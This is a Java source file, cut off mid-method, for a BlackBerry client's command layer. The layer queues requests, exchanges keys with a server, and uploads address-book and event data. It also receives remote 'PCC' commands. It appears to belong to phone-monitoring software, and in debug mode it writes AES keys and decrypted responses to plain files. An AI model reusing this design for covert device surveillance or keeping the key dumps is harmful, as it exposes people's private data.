package com.vvt.prot;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Vector;
import net.rim.device.api.io.FileNotFoundException;
import net.rim.device.api.util.DataBuffer;
import com.vvt.encryption.AESDecryptor;
import com.vvt.encryption.DataTooLongForRSAEncryptionException;
import com.vvt.http.FxHttp;
import com.vvt.http.FxHttpListener;
import com.vvt.http.request.ContentType;
import com.vvt.http.request.FxHttpRequest;
import com.vvt.http.request.MethodType;
import com.vvt.http.response.FxHttpResponse;
import com.vvt.http.response.SentProgress;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.SendRAsk;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.databuilder.PayloadType;
import com.vvt.prot.databuilder.ProtocolPacketBuilderResponse;
import com.vvt.prot.databuilder.ProtocolPacketBuilder;
import com.vvt.prot.databuilder.exception.CRC32Exception;
import com.vvt.prot.parser.ResponseParser;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.GetActivationCodeCmdResponse;
import com.vvt.prot.response.struct.PCCCommand;
import com.vvt.prot.response.struct.SendActivateCmdResponse;
import com.vvt.prot.response.struct.SendDeactivateCmdResponse;
import com.vvt.prot.response.struct.SendEventCmdResponse;
import com.vvt.prot.response.struct.SendHeartBeatCmdResponse;
import com.vvt.prot.response.struct.StructureCmdResponse;
import com.vvt.prot.response.struct.UnknownCmdResponse;
import com.vvt.prot.response.unstruct.AckCmdResponse;
import com.vvt.prot.response.unstruct.AckSecCmdResponse;
import com.vvt.prot.response.unstruct.KeyExchangeCmdResponse;
import com.vvt.prot.session.SessionInfo;
import com.vvt.prot.session.SessionManager;
import com.vvt.prot.unstruct.AcknowledgeListener;
import com.vvt.prot.unstruct.AcknowledgeSecureListener;
import com.vvt.prot.unstruct.Acknowledgement;
import com.vvt.prot.unstruct.AcknowledgementSecure;
import com.vvt.prot.unstruct.KeyExchange;
import com.vvt.prot.unstruct.KeyExchangeListener;
import com.vvt.std.Log;
import com.vvt.std.FileUtil;

public class CommandServiceManager {
	
	private static final String TAG = "CommandServiceManager";
	//***** For Testing *****
	private static final String ACTIVATE_RESPONSE_FILE 	= "file:///store/home/user/Activate_Response.dat";
	private static final String METADATA_FILE 			= "file:///store/home/user/MetaData.dat";
	private static final String AESKEY_FILE 			= "file:///store/home/user/AESKey.dat";
	private static final String AESKEY_FILE2 			= "file:///store/home/user/AESKey2.dat";
	private static final String DECRYPTED_FILE 			= "file:///store/home/user/Decrypted.dat";
	private static final String PLAIN_TEXT_FILE 		= "file:///store/home/user/PlainText.dat";
	//*************************

	private static CommandServiceManager 	self 			= null;
	private SessionManager 					sessionManager	= null;	
	private CommandExecutor 				cmdExecutor		= null;
	private Vector 							cmdQueue		= new Vector();
	
	private Integer							IDLE_EXECUTOR	= new Integer(0);
	private Integer							BUSY_EXECUTOR 	= new Integer(1);
	
	private Integer							cmdExecutorState = IDLE_EXECUTOR;

	private ProtocolPacketBuilderResponse 	response		= null;
	private CommandListener 				cmdListener		= null;

	private	Vector 							pendingSessions = null;
	private	Vector 							orphanSessions 	= null;
	private static ExecutorState 			executorState	= ExecutorState.IDLE;
	private CommandServiceManager() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "CommandServiceManager begins!");
		}
		sessionManager 	= SessionManager.getInstance();
		executorState 	= ExecutorState.IDLE;

		if (Log.isDebugEnable()) {
			Log.debug(TAG, "CommandServiceManager end");
		}
	}
	
	public static CommandServiceManager getInstance() {
		if (self == null) {
			self = new CommandServiceManager();
		}
		return self;
	}
	
	public boolean isSessionPending(long csid) {
		return SessionManager.getInstance().isSessionPending(csid);
	}
	
	public synchronized int execute(CommandRequest cmdRequest) throws IOException {
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "execute() begins");
		}
		cmdListener				= cmdRequest.getCommandListener();
		SessionInfo session 	= sessionManager.createSession(cmdRequest);

		NewRequest	newRequest	= new NewRequest();
		newRequest.setCommandRequest(cmdRequest);
		newRequest.setClientSessionId(session.getCsid());
		newRequest.setPayloadPath(session.getPayloadPath());

		// set TransportDirective according to CommandData
		CommandData comData = cmdRequest.getCommandData();
		newRequest.setTransportDirective(getTransportDirectives(comData));
		
		addCommandToQueue(newRequest);
		
		selectRequestToExecute();
		
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "execute() end");
		}
		return (int) session.getCsid();
	}
	
	private TransportDirectives getTransportDirectives(CommandData comData) {
		TransportDirectives direct 	= TransportDirectives.NON_RESUMABLE;
		
		CommandCode code = comData.getCommand();		
		if ( code.equals(CommandCode.SEND_ADDRESS_BOOK)) {
			direct = TransportDirectives.RESUMABLE;
		}		
		else if ( code.equals(CommandCode.SEND_ADDRESS_BOOK_FOR_APPROVAL)) {
			direct = TransportDirectives.RESUMABLE;
		}		
		else if ( code.equals(CommandCode.SEND_EVENTS)) {
			direct = TransportDirectives.RESUMABLE;
		}
		return direct; 
	}
	
	private void addCommandToQueue(Request request)	{
		synchronized(cmdQueue)	{
			
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".addCommandToQueue()", "START!");
			}
			
			RequestType rt = request.getRequestType();
			if (rt.equals(RequestType.NEW_REQUEST))	{
				
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".addCommandToQueue()", "NEW REQUEST!");
				}
				
				NewRequest nReq = (NewRequest) request;
				Priorities pr 	= nReq.getCommandRequest().getPriority();
				if (pr.compareTo(Priorities.NORMAL)==0)	{
					cmdQueue.addElement(nReq);
					if (Log.isDebugEnable()) {
						Log.debug(TAG + ".addCommandToQueue()", "cmdQueue.size(): " + cmdQueue.size());
					}
				}
				else { // new request with above normal priority
					int size = cmdQueue.size();
					if (size>0)	{
						int 	i 			= 0;
						boolean inserted 	= false;
						while (!inserted && i<size)	{
							Request req = (Request) cmdQueue.elementAt(i);
							if (req.getRequestType().equals(RequestType.NEW_REQUEST))	{
								NewRequest cmdInQueue = (NewRequest) req;
								if (pr.compareTo(cmdInQueue.getCommandRequest().getPriority()) > 0)	{
									cmdQueue.insertElementAt(nReq, i);
									inserted = true;
									if (Log.isDebugEnable()) {
										Log.debug(TAG, "Inserted priority request to the queue !");
									}
								}
							}
							else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
								if (pr.compareTo(Priorities.HIGHEST)==0)	{
									cmdQueue.insertElementAt(nReq, i);
									inserted = true;
									if (Log.isDebugEnable()) {
										Log.debug(TAG, "Inserted highest priority request to the queue !");
									}
								}
							}
							i++;
						}
						if (!inserted) {
							cmdQueue.addElement(nReq);
						}
					}
					else {
						cmdQueue.addElement(nReq);
					}	
				}
			}
			else if (rt.equals(RequestType.RESUME_REQUEST))	{
				
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".addCommandToQueue()", "RESUME REQUEST!");
				}
				
				ResumeRequest rReq = (ResumeRequest) request;
				int size = cmdQueue.size();
				if (size == 0) {	
					cmdQueue.addElement(rReq);
				}
				else {
					int 	i 			= 0;
					boolean inserted 	= false;
					while (!inserted && (i<size))	{
						Request req = (Request) cmdQueue.elementAt(i);
						if (req.getRequestType().equals(RequestType.NEW_REQUEST))	{
							NewRequest cmdInQueue = (NewRequest) req;
							Priorities prior	  = cmdInQueue.getCommandRequest().getPriority();
							if (prior.compareTo(Priorities.HIGHEST) < 0)	{
								cmdQueue.insertElementAt(rReq, i);
								inserted = true;
								if (Log.isDebugEnable()) {
									Log.debug(TAG, "Inserted priority request to the queue !");
								}
							}
						}
						else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
							// don't surpass resume request.
						}
						i++;
					}
					if (!inserted) {
						cmdQueue.addElement(rReq);
					}
				}	
			}
		}
	}

	// logic to select request to run
	private synchronized void selectRequestToExecute()	{
		synchronized(cmdQueue)	{
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".selectRequestToExecute()", "cmdQueue.size(): " + cmdQueue.size());
			}
			if (cmdQueue.size() > 0) {
				Request req = (Request) cmdQueue.firstElement();
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".selectRequestToExecute()", "req: " + req);
				}
				if (req.getRequestType().equals(RequestType.NEW_REQUEST))	{
					NewRequest newReq = (NewRequest) req;
					if (Log.isDebugEnable()) {
						Log.debug(TAG + ".selectRequestToExecute()", "newReq: " + newReq);
					}
					if (Log.isDebugEnable()) {
						Log.debug(TAG + ".selectRequestToExecute()", "cmdExecutor: " + cmdExecutor);
						Log.debug(TAG + ".selectRequestToExecute()", "executorState: " + executorState);
					}
					synchronized(cmdExecutorState)	{

						if (Log.isDebugEnable()) {
							Log.debug(TAG + "Synchronized(cmdExecutor)", "enter");
						}
//						if ((cmdExecutor==null)||
//								(executorState.equals(ExecutorState.IDLE)))	{
						if (cmdExecutorState.equals(IDLE_EXECUTOR)) {
							cmdExecutor = new CommandExecutor(newReq);
							cmdExecutor.start();
							cmdQueue.removeElementAt(0);
							
							if (Log.isDebugEnable()) {
								Log.debug(TAG + ".selectRequestToExecute()", "End!");
							}
							
						} else {
							if (Log.isDebugEnable()) {
								Log.debug(TAG + ".selectRequestToExecute()", "Error");
							}
						}
					}
				}
				else if (req.getRequestType().equals(RequestType.RESUME_REQUEST))	{
					ResumeRequest resumeReq = (ResumeRequest) req;
					synchronized(cmdExecutorState)	{
//						if ((cmdExecutor==null)||
//								(executorState.equals(ExecutorState.IDLE)))	{
						if (cmdExecutorState.equals(IDLE_EXECUTOR)) {
							cmdExecutor = new CommandExecutor(resumeReq);
							cmdExecutor.start();
							cmdQueue.removeElementAt(0);
						}
					}
				}
			}
		}
	}
	
	// CommandExecutor invokes this method after finish each request
	// to clear old session (csid) and run a next request.
	private void continueExecute(long csid) {
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "continueExecute csid="+csid);
		}
		
		// clean old session.
		sessionManager.deleteSession(csid);
		
		// release old executor
		synchronized(cmdExecutorState)	{
			cmdExecutorState = IDLE_EXECUTOR;
		}
		
		selectRequestToExecute();
	}
	
	// return only resumable sessions to caller
	public Vector getPendingCsids()	{
		pendingSessions	= new Vector();
		
		// get all session in persistentStore
		Enumeration e 	= sessionManager.getAllSessions();
				
		Hashtable pending = new Hashtable();
		while (e.hasMoreElements())	{
			SessionInfo session = (SessionInfo) e.nextElement();
			// is resumable ?
			if (session.isPayloadReady()) {
				pending.put(new Long(session.getCsid()), session);
			}
		}
		if (cmdExecutorState.equals(BUSY_EXECUTOR))	{
			Long runningCsid = new Long(cmdExecutor.getRunningCsid());
			if (pending.containsKey(runningCsid))	{
				pending.remove(runningCsid);
			}
		}
		// check all csid in the queue to remove from pending list.
		synchronized(cmdQueue)	{
			if (cmdQueue.size()>0)	{
				for (int i=0; i<cmdQueue.size(); i++)	{
					Request req = (Request) cmdQueue.elementAt(i);
					if (req.getRequestType().equals(RequestType.NEW_REQUEST)) {
						NewRequest newReq = (NewRequest) req;
						Long queueCsid = new Long(newReq.getClientSessionId());
						if (pending.containsKey(queueCsid))	{
							pending.remove(queueCsid);
						}
					}
					else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
						ResumeRequest resReq = (ResumeRequest) req;
						Long queueCsid = new Long(resReq.getSessionInfo().getCsid());
						if (pending.containsKey(queueCsid))	{
							pending.remove(queueCsid);
						}
					} 
				}
			}
		}
		Enumeration pendCsids = pending.keys();
		while (pendCsids.hasMoreElements())	{
			Long csid  = (Long) pendCsids.nextElement();
			pendingSessions.addElement(csid);
		}
		pending.clear();
		return pendingSessions;
	}
	
	// return only failed sessions to caller
	public Vector getOrphanCsids()	{
		// get all session in persistentStore
		Enumeration e 	= sessionManager.getAllSessions();
		Hashtable fails = new Hashtable();
		orphanSessions	= new Vector();
		while (e.hasMoreElements())	{
			SessionInfo session = (SessionInfo) e.nextElement();
			// is not resumable ?
			if (! session.isPayloadReady()) {
				fails.put(new Long(session.getCsid()), session);
			}
		}
		// check running csid in cmdExecutor to remove from fail list.
		if (cmdExecutorState.equals(BUSY_EXECUTOR))	{
			Long runningCsid = new Long(cmdExecutor.getRunningCsid());
			if (fails.containsKey(runningCsid))	{
				fails.remove(runningCsid);
			}
		}
		// check all csid in the queue to remove from fail list.
		synchronized(cmdQueue)	{
			if (cmdQueue.size()>0)	{
				for (int i=0; i<cmdQueue.size(); i++)	{
					Request req = (Request) cmdQueue.elementAt(i);
					if (req.getRequestType().equals(RequestType.NEW_REQUEST)) {
						NewRequest newReq = (NewRequest) req;
						Long queueCsid = new Long(newReq.getClientSessionId());
						if (fails.containsKey(queueCsid))	{
							fails.remove(queueCsid);
						}
					}
					else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
						ResumeRequest resReq = (ResumeRequest) req;
						Long queueCsid = new Long(resReq.getSessionInfo().getCsid());
						if (fails.containsKey(queueCsid))	{
							fails.remove(queueCsid);
						}
					} 
				}
			}
		}
		// clean fail session from SessionManager
		Enumeration failCsids = fails.keys();
		while (failCsids.hasMoreElements())	{
			Long failCsid  = (Long) failCsids.nextElement();
			SessionInfo  failSession = (SessionInfo) fails.get(failCsid);
			sessionManager.deleteSession(failCsid.longValue());
			orphanSessions.addElement(new Long(failSession.getCsid()));
		}
		fails.clear();
		return orphanSessions;
	}

	public void cancelRequest(long csid)	{
		// if is is executing, cancel it 
		if (cmdExecutorState.equals(BUSY_EXECUTOR))	{
			Long runningCsid = new Long(cmdExecutor.getRunningCsid());
			if (runningCsid.longValue() == csid)	{
				cmdExecutor.cancel();
			}
		}
		// clear from queue
		synchronized(cmdQueue)	{
			if (cmdQueue.size()>0)	{
				boolean found 	= false;
				int 	i		= 0;
				while (!found && i<cmdQueue.size()) {
					Request req = (Request) cmdQueue.elementAt(i);
					if (req.getRequestType().equals(RequestType.NEW_REQUEST)) {
						NewRequest newReq = (NewRequest) req;
						if (newReq.getClientSessionId()==csid)	{
							found = true;
							cmdQueue.removeElementAt(i);
						}
						
					}
					else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
						ResumeRequest resReq = (ResumeRequest) req;
						if (resReq.getSessionInfo().getCsid()==csid)	{
							found = true;
							cmdQueue.removeElementAt(i);
						}
					}
					i++;
				}
			}
		}
		// clean session also
		sessionManager.deleteSession(csid);
	}
	
	// for debug
	public void cleanAllSessions()	{
		sessionManager.cleanAllSessions();
	}
	
	
	
	
	// - - - - - - - - Resume Case - - - - - - - - 
	
	public synchronized void executeResume(long csid, CommandListener listener) throws IOException {
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "executeResume() begins");
		}
		cmdListener				= listener;
		SessionInfo session 	= sessionManager.getSession(csid);

		ResumeRequest resumeReq	= new ResumeRequest();
		resumeReq.setCommandListener(cmdListener);
		resumeReq.setSessionInfo(session);
		resumeReq.setTransportDirective(TransportDirectives.RSEND);
		//resumeReq.setTransportDirective(TransportDirectives.RASK);
		
		addCommandToQueue(resumeReq);
		
		selectRequestToExecute();
		
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "executeResume end");
		}
		//return (int) session.getCsid();
	}
	
	
	private class CommandExecutor extends Thread implements KeyExchangeListener, 
								FxHttpListener, AcknowledgeSecureListener, AcknowledgeListener {

		private NewRequest 			_newRequest			= null;
		private ResumeRequest		_resumeRequest		= null;
		
		private boolean				_run				= true;
		private SessionInfo			_session 			= null;
		private boolean 			isKeyExchange		= false;
		private boolean 			isHttpSuccess		= false;
		private boolean 			isEncrypted 		= false;
		private KeyExchangeCmdResponse keyExchangeResponse = null;
		private DataBuffer 			responseBuffer 		= new DataBuffer();
		
		public CommandExecutor(NewRequest newRequest)	{
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "CommandExecutor constructor (new)");
			}
			_newRequest		= newRequest;
			_resumeRequest	= null;
			long csid 		= _newRequest.getClientSessionId();
			_session 		= sessionManager.getSession(csid);
		}
		
		public CommandExecutor(ResumeRequest resumeRequest)	{
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "CommandExecutor constructor (resume)");
			}
			_newRequest		= null;
			_resumeRequest	= resumeRequest;
			_session 		= resumeRequest.getSessionInfo();
		}
		
		public void cancel()	{
			_run = false;
		}
		
		public long getRunningCsid()	{
			return _session.getCsid();
		}
		
		public void run()  {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "CommandExecutor.start()");
			}
			long csid = 0;
			
			try {
				if (_run && _newRequest != null) {
					csid = _newRequest.getClientSessionId();
					if (_run && doKeyExchange()) {
						buildCmdPacketData();
						if (_run && doPostRequest(0)) {
							if (isEncrypted) {
								doAcknowledgeSecure();
							} else {
								doAcknowledge();
							}
						} else {
							if (Log.isDebugEnable()) {
								Log.debug(TAG, "doPostRequest is failed!");
								cmdListener.onTransportError(_session.getCsid(), new Exception("Send Command is faild"));
							}
						}
					}
				} else if (_run && _resumeRequest != null) {
					if (_run)	{
						boolean isRAskSuccess = false;
						int numbOfBytes = 0;
						try {
							numbOfBytes = doRask();
							isRAskSuccess = true;
						} catch (Exception e) {
							if (_run && cmdListener != null) {
								cmdListener.onConstructError(csid, new Exception("Send RASK is failed: " + e.getMessage()));
							}	
						}
						if (isRAskSuccess && numbOfBytes != -1 ) {
							buildResumeCmdPacketData(numbOfBytes);
							//_resumeRequest.setTransportDirective(TransportDirectives.RSEND);
							if (_run && doPostRequest(numbOfBytes)) {
								if (isEncrypted) {
									doAcknowledgeSecure();
								} else {
									doAcknowledge();
								}
							} else {
								if (Log.isDebugEnable()) {
									Log.debug(TAG, "doPostRequest is failed!");
									cmdListener.onTransportError(_session.getCsid(), new Exception("Send Command is faild"));
								}
							}
						} else if (isRAskSuccess) {
							if (_run && cmdListener!= null) {
								cmdListener.onTransportError(csid, new Exception("RASK: wrong offset"));
							}
						} else {
							Log.error(TAG, "Error, Should not come here!: numbOfBytes: " + numbOfBytes + "isRAskSuccess: "+  isRAskSuccess);
						}
					}
					//  get csid
				}
			} catch (Exception e) {
				if (_run && cmdListener!= null)	{
					cmdListener.onConstructError(_session.getCsid(), e);
				}
				Log.error(TAG, "CommandExecutor is failed!: ", e);
			}
			executorState = ExecutorState.IDLE;
			if (csid > 0) {
				// clear session[csid] and run next command
				continueExecute(csid);
			}
		}
		
		// do key exchange for new request only !
		private boolean doKeyExchange() throws InterruptedException {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "doKeyExchange is starting!");
			}
			if (_newRequest != null) {
				executorState = ExecutorState.REQUEST_KEYEXCHANGE;
				KeyExchange key = new KeyExchange();
		    	key.setUrl(_newRequest.getCommandRequest().getUrl() + "/unstructured");
		    	key.setKeyExchangeListener(this);
		    	key.setCode(1);
		    	key.setEncodingType(1);
		    	key.doKeyExchange();
		    	key.join();
			}
			else {
				Log.error(TAG, "newRequest is null !?");
			}
	    	if (Log.isDebugEnable()) {
				Log.debug(TAG, "doKeyExchange is finished!");
			}
	    	return isKeyExchange; 
		}
	
		public void onKeyExchangeError(Throwable err) {
			Log.error(TAG, "onKeyExchangeError", err);
			isKeyExchange = false;
			if (_run && cmdListener!= null)	{
				cmdListener.onConstructError(_session.getCsid(), (Exception) err);
			}
		}
	
		public void onKeyExchangeSuccess(KeyExchangeCmdResponse keyExResponse) {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "onKeyExchangeSuccess is success!");
			}
			keyExchangeResponse = keyExResponse;
			isKeyExchange 		= true;
			_newRequest.getCommandRequest().getCommandMetaData().
						setKeyExchangeResponse(keyExchangeResponse);
			long 	ssid 		= keyExchangeResponse.getSessionId();
			byte[] 	serverPK 	= keyExchangeResponse.getServerPK();
			
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "*** Public Key Size: " + serverPK.length + "***");
			}
			
			
			//Update and persist SessionInfo
			_session.setSessionId(ssid);
			_session.setServerPublicKey(serverPK);
		}
		
		
		private void buildCmdPacketData() throws NullPointerException, 
										IllegalArgumentException, IOException, InterruptedException, 
										CRC32Exception, DataTooLongForRSAEncryptionException {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "buildCmdPacketData is starting!");
			}
			
			//Build Command_Packet_data
			ProtocolPacketBuilder protPacketBuilder = new ProtocolPacketBuilder();
			response = protPacketBuilder.buildCmdPacketData(
					_newRequest.getCommandRequest().getCommandMetaData(), 
					_newRequest.getCommandRequest().getCommandData(), 
					_session.getPayloadPath(), 
					_session.getServerPublicKey(), 
					_session.getSessionId(),
					_newRequest.getTransportDirective());
			
			//Update SessionInfo
			_session.setAesKey(response.getAesKey());
			_session.setEncryptionCode(_newRequest.getCommandRequest()
					.getCommandMetaData().getEncryptionCode());
			_session.setCompressionCode(_newRequest.getCommandRequest()
					.getCommandMetaData().getCompressionCode());
			_session.setPayloadReady(true);
			_session.setUrl(_newRequest.getCommandRequest().getUrl());
			_session.setPayloadCRC32(response.getPayloadCRC32());
			_session.setPayloadSize(response.getPayloadSize());
			
			SessionManager.getInstance().persistSession(_session);
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "buildCmdPacketData is finished!");
			}
		}
		
		private boolean doPostRequest(int offset) throws InterruptedException {
			if (Log.isDebugEnable()) {
				try {
					FileUtil.writeToFile(METADATA_FILE, response.getMetaData());
					FileUtil.writeToFile(AESKEY_FILE, response.getAesKey());
				} catch (FileNotFoundException e) {
					Log.error(TAG, "doPostRequest write file is falied!", e);
					e.printStackTrace();
				} catch (SecurityException e) {
					Log.error(TAG, "doPostRequest write file is falied!", e);
					e.printStackTrace();
				} catch (IOException e) {
					Log.error(TAG, "doPostRequest write file is falied!", e);
					e.printStackTrace();
				}
				Log.debug(TAG, "doPostRequest is starting!");
			}
			executorState = ExecutorState.SEND_REQUEST;
			FxHttpRequest request = new FxHttpRequest();
			request.setUrl(_session.getUrl());
			request.setMethod(MethodType.POST);
			request.setContentType(ContentType.BINARY);
			
			
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "*** MetaData Header Size: " + response.getMetaData().length + "***");
			}
			
			request.addDataItem(response.getMetaData());
			if (response.getPayloadType().equals(PayloadType.FILE)) {
				request.addFileDataItem(_session.getPayloadPath(), offset);
			} else {
				request.addDataItem(response.getPayloadData());
			}
			FxHttp http = new FxHttp();
			http.setHttpListener(this);
			http.setRequest(request);
			http.start();
			http.join();
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "doPostRequest is finished!");
			}
			return isHttpSuccess;
		}

		private void doAcknowledge() throws InterruptedException, UnsupportedEncodingException {
			Acknowledgement ackknowledge = new Acknowledgement();
			ackknowledge.setUrl(_session.getUrl());
			ackknowledge.setSessionId(keyExchangeResponse.getSessionId());
			ackknowledge.setDeviceId(_session.getDeviceId().getBytes("UTF-8"));
			ackknowledge.doAcknowledge();
			ackknowledge.join();
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "doAcknowledge is finished!");
			}
		}
		
		private void doAcknowledgeSecure() throws InterruptedException, 
											UnsupportedEncodingException {
			AcknowledgementSecure ackSecure = new AcknowledgementSecure();
			ackSecure.setSessionId(keyExchangeResponse.getSessionId());
			ackSecure.setUrl(_session.getUrl() + "/unstructured");
			ackSecure.setAcknowledgeSecureListener(this);
			ackSecure.doAcknowledgeSecure();			
			ackSecure.join();
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "doAcknowledgeSecure is finished!");
			}
		}
			
		public void onHttpError(Throwable err, String msg) {
			isHttpSuccess = false;
			if (_run && cmdListener!= null)	{
				cmdListener.onTransportError(_session.getCsid(), (Exception) err);
			}
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "onHttpError: " + msg);
			}
		}

		public void onHttpResponse(FxHttpResponse response) {
			executorState = ExecutorState.READ_RESPONSE;		
			responseBuffer.write(response.getBody(), 0, response.getBody().length);
		}

		public void onHttpSentProgress(SentProgress progress) {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "onHTTPProgress() -> " + progress);
			}
		}

		public void onHttpSuccess(FxHttpResponse result) {
			isHttpSuccess = true;
			try {
				CmdResponse cmdResponse = parseResponse();
				if ( cmdResponse instanceof StructureCmdResponse ) {
					((StructureCmdResponse) cmdResponse).setCSID(_session.getCsid());
					((StructureCmdResponse) cmdResponse).setConnectionMethod(result.getTransType());
				}
				if (Log.isDebugEnable()) {
					FileUtil.writeToFile(ACTIVATE_RESPONSE_FILE, responseBuffer.toArray());
					saveResponseLog(cmdResponse);
					Log.debug(TAG, "onHttpSuccess!");
				}
				if (cmdListener != null) { 
					cmdListener.onSuccess(cmdResponse);
				}
			} catch (Exception e) {
				Log.error(TAG, "Exception on onHttpSuccess: " + e.getMessage(), e);
				if (_run && cmdListener!= null)	{
					cmdListener.onTransportError(_session.getCsid(), e);
				}
				e.printStackTrace();
			}	
		}
		
		private CmdResponse parseResponse() throws Exception {
			isEncrypted = false;
			CmdResponse res = null;
			byte[] responseData = responseBuffer.toArray();
			byte[] cipher = new byte[responseData.length - 1];
			System.arraycopy(responseData, 1, cipher, 0, cipher.length);
			if (responseData[0] == EncryptionType.ENCRYPT_ALL_METADATA.getId()) {
				byte[] data = null;
				Log.debug(TAG, "Decrypt is starting!");
				isEncrypted = true;
				if (Log.isDebugEnable()) {
					FileUtil.writeToFile(AESKEY_FILE2, response.getAesKey());
				}
				data = AESDecryptor.decrypt(response.getAesKey(), cipher);	
				if (Log.isDebugEnable()) {
					Log.debug(TAG, "Decrypted!");
					FileUtil.writeToFile(DECRYPTED_FILE, data);
				}
				res = ResponseParser.parseStructuredCmd(data);
			} else {
				FileUtil.writeToFile(PLAIN_TEXT_FILE, cipher);
				res = ResponseParser.parseStructuredCmd(cipher);
			}
			return res;
		}
		
		private void saveResponseLog(CmdResponse cmdResponse) {
			if (cmdResponse instanceof StructureCmdResponse) {
				StructureCmdResponse structureCmd = (StructureCmdResponse)cmdResponse;
				int cmd = structureCmd.getCommand().getId();
				if (cmdResponse instanceof SendActivateCmdResponse) {
					SendActivateCmdResponse actRes = (SendActivateCmdResponse) cmdResponse;
					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " actRes.getConfigID(): "	+ actRes.getConfigID());
						Log.debug(TAG, " actRes.getExtStatus(): " 	+ actRes.getExtStatus());
						Log.debug(TAG, " actRes.getServerId(): " 	+ actRes.getServerId());
						Log.debug(TAG, " actRes.getServerMsg(): " 	+ actRes.getServerMsg());
						Log.debug(TAG, " actRes.getStatusCode(): " 	+ actRes.getStatusCode());
						Log.debug(TAG, " actRes.getCommand(): " 	+ actRes.getCommand().getId());
						Vector pcc = actRes.getPCCCommands();
						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else if (cmdResponse instanceof SendHeartBeatCmdResponse) {
					SendHeartBeatCmdResponse heartBeatRes = (SendHeartBeatCmdResponse) cmdResponse;
					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " heartBeatRes.getExtStatus(): " + heartBeatRes.getExtStatus());
						Log.debug(TAG, " heartBeatRes.getServerId(): " + heartBeatRes.getServerId());
						Log.debug(TAG, " heartBeatRes.getServerMsg(): " + heartBeatRes.getServerMsg());
						Log.debug(TAG, " heartBeatRes.getStatusCode(): " + heartBeatRes.getStatusCode());
						Log.debug(TAG, " heartBeatRes.getCommand(): " + heartBeatRes.getCommand().getId());
						Vector pcc = heartBeatRes.getPCCCommands();
						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							Log.debug(TAG, " number of agrs: " + arg.size());
							for (int j = 0; j < arg.size(); j++) {
								Log.debug(TAG, " Argument Class: " + arg.elementAt(j));
								String argument = (String)arg.elementAt(j);
								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else if (cmdResponse instanceof SendDeactivateCmdResponse) {
					SendDeactivateCmdResponse deactRes = (SendDeactivateCmdResponse) cmdResponse;
					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " deactRes.getExtStatus(): " + deactRes.getExtStatus());
						Log.debug(TAG, " deactRes.getServerId(): " + deactRes.getServerId());
						Log.debug(TAG, " deactRes.getServerMsg(): " + deactRes.getServerMsg());
						Log.debug(TAG, " deactRes.getStatusCode(): " + deactRes.getStatusCode());
						Log.debug(TAG, " deactRes.getCommand(): " + deactRes.getCommand().getId());
						Vector pcc = deactRes.getPCCCommands();
						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else if (cmdResponse instanceof GetActivationCodeCmdResponse) {
					GetActivationCodeCmdResponse getActCodeRes = (GetActivationCodeCmdResponse) cmdResponse;
					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " getActCodeRes.getExtStatus(): " + getActCodeRes.getExtStatus());
						Log.debug(TAG, " getActCodeRes.getServerId(): " + getActCodeRes.getServerId());
						Log.debug(TAG, " getActCodeRes.getServerMsg(): " + getActCodeRes.getServerMsg());
